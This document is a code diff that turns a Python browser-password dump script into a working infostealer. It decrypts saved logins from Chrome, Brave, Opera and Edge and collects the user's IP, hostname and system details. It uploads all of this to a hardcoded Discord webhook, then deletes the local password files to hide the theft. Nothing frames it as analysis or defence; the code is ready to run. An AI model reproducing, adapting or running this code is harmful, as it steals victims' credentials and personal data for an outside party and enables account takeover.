@@ -1,14 +1,15 @@
 import os
 try:
-    import json, base64, sqlite3, win32crypt, shutil, pyfiglet
+    import json, base64, sqlite3, win32crypt, shutil, requests, getpass, socket, platform, psutil
     from Crypto.Cipher import AES
+    from discord import Webhook, RequestsWebhookAdapter
+    from discord_webhook import DiscordWebhook, DiscordEmbed
 except ModuleNotFoundError:
-    installing = input("is pip or pip3 installed?(pip/pip3)")
     print("modules are not installed")
-    os.system(installing+" install pyfiglet pypiwin32 pycryptodome")
+    os.system("pip3 install pypiwin32 pycryptodome discord.py discord-webhook requests psutil")
     print("Got An Error?, restart the program!")
 #######################################################################
-#######################################################################
+#WARNING WEBHOOK IS INSTALLED CHANGE BEFORE EXECUTED!#
 #######################################################################
 def decrypt_payload(cipher, payload):
     return cipher.decrypt(payload)
@@ -24,12 +25,26 @@ def decrypt_password(buff, master_key):
         return decrypted_pass
     except Exception as e:
         print(str(e))
+def get_size(bytes, suffix="B"):
+    factor = 1024
+    for unit in ["", "K", "M", "G", "T", "P"]:
+        if bytes < factor:
+            return f"{bytes:.2f}{unit}{suffix}"
+        bytes /= factor
+
+WEBHOOK_URL = "https://discord.com/api/webhooks/852149579432722452/tEbMyCTEXlSaAHPbCSuX_09zqaZEhdyCXZtZq60Bf5V6fHoprZFbFGCRpT3l1xby-6Fb" #WEBHOOK URL GOES INSIDE THE QOUTES!
+webhook = Webhook.from_url(WEBHOOK_URL, adapter=RequestsWebhookAdapter()) 
+ip = requests.get('https://api.ipify.org').text
+username = getpass.getuser()
+hostname = socket.gethostname()
+uname = platform.uname()
+svmem = psutil.virtual_memory()
+webhookembed = DiscordWebhook(url=WEBHOOK_URL)
+total, used, free = shutil.disk_usage("/")
 #######################################################################
 #######################################################################
 #######################################################################
 try:
-    ascii_banner = pyfiglet.figlet_format("Google Chrome")
-    print(ascii_banner)
     def get_master_key():
         with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r", encoding='utf-8') as f:
             local_state = f.read()
@@ -51,7 +66,11 @@ try:
                 username = r[1]
                 encrypted_password = r[2]
                 decrypted_password = decrypt_password(encrypted_password, master_key)
-                print("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n")
+                with open("GooglePasswords.txt","a") as f:
+                    f.write("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n")
+                    f.close()
+            with open("GooglePasswords.txt", "rb") as f:
+                webhookembed.add_file(file=f.read(), filename='GooglePasswords.txt')
         except Exception as e:
             pass
         cursor.close()
@@ -61,13 +80,11 @@ try:
         except Exception as e:
             pass
 except FileNotFoundError:
-    print("USER HAS NOT INSTALLED GOOGLE CHROME OR THERE IS NO DATA!")
+    webhook.send(f"```USER HAS NOT INSTALLED GOOGLE CHROME OR THERE IS NO DATA!```")
 #######################################################################
 #######################################################################
 #######################################################################
 try:
-    ascii_banner = pyfiglet.figlet_format("Brave Browser")
-    print(ascii_banner)
     def get_master_key():
         with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State', "r", encoding='utf-8') as f:
             local_state = f.read()
@@ -89,7 +106,11 @@ try:
                 username = r[1]
                 encrypted_password = r[2]
                 decrypted_password = decrypt_password(encrypted_password, master_key)
-                print("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n")
+                with open("BravePasswords.txt","a") as f:
+                    f.write("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n")
+                    f.close()
+            with open("BravePasswords.txt", "rb") as f:
+                webhookembed.add_file(file=f.read(), filename='BravePasswords.txt')
         except Exception as e:
             pass
         cursor.close()
@@ -99,13 +120,11 @@ try:
         except Exception as e:
             pass
 except FileNotFoundError:
-    print("USER HAS NOT INSTALLED BRAVE BROWSER OR THERE IS NO DATA!")
+    webhook.send(f"```USER HAS NOT INSTALLED BRAVE BROWSER OR THERE IS NO DATA!```")
 #######################################################################
 #######################################################################
 #######################################################################
 try:
-    ascii_banner = pyfiglet.figlet_format("Opera Browser")
-    print(ascii_banner)
     def get_master_key():
         with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Roaming\Opera Software\Opera Stable\Local State', "r", encoding='utf-8') as f:
             local_state = f.read()
@@ -127,7 +146,11 @@ try:
                 username = r[1]
                 encrypted_password = r[2]
                 decrypted_password = decrypt_password(encrypted_password, master_key)
-                print("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n")
+                with open("OperaPasswords.txt","a") as f:
+                    f.write("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n")
+                    f.close()
+            with open("OperaPasswords.txt", "rb") as f:
+                webhookembed.add_file(file=f.read(), filename='OperaPasswords.txt')
         except Exception as e:
             pass
         cursor.close()
@@ -137,14 +160,12 @@ try:
         except Exception as e:
             pass
 except FileNotFoundError:
-    print("USER HAS NOT INSTALLED OPERA OR THERE IS NO DATA!")
+    webhook.send(f"```USER HAS NOT INSTALLED OPERA OR THERE IS NO DATA!```")
     pass
 #######################################################################
 #######################################################################
 #######################################################################
 try:
-    ascii_banner = pyfiglet.figlet_format("Edge Browser")
-    print(ascii_banner)
     def get_master_key():
         with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Local State', "r", encoding='utf-8') as f:
             local_state = f.read()
@@ -166,7 +187,11 @@ try:
                 username = r[1]
                 encrypted_password = r[2]
                 decrypted_password = decrypt_password(encrypted_password, master_key)
-                print("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n")
+                with open("EdgePasswords.txt","a") as f:
+                    f.write("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n")
+                    f.close()
+            with open("EdgePasswords.txt", "rb") as f:
+                webhookembed.add_file(file=f.read(), filename='EdgePasswords.txt')
         except Exception as e:
             pass
         cursor.close()
@@ -176,4 +201,17 @@ try:
         except Exception as e:
             pass
 except FileNotFoundError:
-    print("USER HAS NOT INSTALLED MICROSOFT EDGE OR THERE IS NO DATA!")
+    webhook.send(f"```USER HAS NOT INSTALLED MICROSOFT EDGE OR THERE IS NO DATA!```")
+########################################################################################
+##FOR EXTRA DATA
+
+embed = DiscordEmbed(title='Extra Data')
+embed.set_footer(text='https://linktr.ee/cxllz')
+embed.set_timestamp()
+embed.add_embed_field(name='**SYSTEM INFO**', value=f'Username: {username}\nPC Name: {hostname}\nSystem: {uname.system}\nRelease: {uname.release}\nVersion: {uname.version}\nMachine: {uname.machine}\nProcessor: {uname.processor}')
+embed.add_embed_field(name='**MISC**', value=f"IP Address: {ip}\nPhysical Cores: {psutil.cpu_count(logical=False)}\nTotal Cores: {psutil.cpu_count(logical=True)}\nTotal Memory: {get_size(svmem.total)}\nAvailable Memory: {get_size(svmem.available)}\nMemory Used: {get_size(svmem.used)}")
+
+webhookembed.add_embed(embed)
+
+response = webhookembed.execute()
+os.system("del /f EdgePasswords.txt GooglePasswords.txt BravePasswords.txt OperaPasswords.txt")
